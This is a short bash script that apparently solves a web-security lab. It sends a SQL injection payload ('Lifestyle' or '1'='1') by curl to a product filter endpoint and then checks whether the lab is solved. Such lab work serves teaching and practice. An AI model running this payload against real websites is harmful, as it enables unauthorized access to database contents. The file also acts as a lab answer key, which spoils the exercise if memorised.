#!/bin/bash

source ../common.hook

INPUT=/filter?category=Lifestyle'+or+'1'='1#

output "Trying ${PS_URL}${INPUT}" INFO
curl "${PS_URL}${INPUT}"

eval_result $PS_URL
